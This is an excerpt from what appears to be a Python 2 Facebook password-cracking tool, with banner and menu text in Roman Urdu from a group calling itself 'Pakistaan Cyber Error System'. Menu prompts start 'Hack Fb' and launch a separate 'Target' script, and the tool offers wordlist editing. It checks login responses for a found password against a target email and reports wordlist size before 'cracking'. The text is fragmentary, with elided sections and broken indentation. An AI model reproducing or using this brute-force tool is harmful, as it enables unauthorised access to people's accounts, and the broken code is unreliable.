...
def banner():
    os.system('clear')
    print " "
    runntxt(GL+"              As Salamu'Alaikum. ^_^")
    runntxt(WW+"   ..................  Stay Home Stay Safe㋡")
    runntxt(WW+"     ....       MR_Ze3㋡")
    runntxt(GL+"                   Don't Copy Father's Sript〄")
    runntxt(GG+"     ..........     Em Not Responcible For Any MissUse៚")
    runntxt(Y+"    ............       100% New Updated Tool㋡")
    runntxt(GG+"           ㋡ Wellcome ㋡ ")
    time.sleep(1.5)
    print GG+"  √=============================================√"
    ...
    print GL+"  |          Munda Jattan Da Kharaß             |"
    print WW+"  |        TEAM : Pakistaan Cyber Error System  |"
    print Y+"   |    INSTAGRAM: Em Not There                  |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        Life Of Programmer [ L.O.P ]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   Hack FaceBook Start ^_^ •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         SamjhDari Se Istemaal Krein "
...
def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb Start...\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 Target')
                elif g == 'n' or g == 'N':
                    print wd+"Exit Marni Hai㋡?..."
                    sys.exit()
                else:
                    print RR+"SaHii Intekhaaß Krein㋡..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit Wordlist Karni...? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
	...
	if mask != login and (not 'login_attempt' in mask):
			...
			print "          P A S S W O R D  F I N D "
	         	...
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        ...
        	        print " "
        	        raw_input(WW+" Back Jane Kliye Enter Prexx Krein㋡...")
			sys.exit(1)
    ...
    .s-     --                      .:     -s.
     ...
     -s.     `--`                `.-`     .s-
      ...
      """
         ...
         print wd+" [#] Majooda Passwords៚\033[97;1m:", len(nuub),'password'
         print wd+" [#] Just Wait & Watch Cracking\033[97;1m..."
         print " "
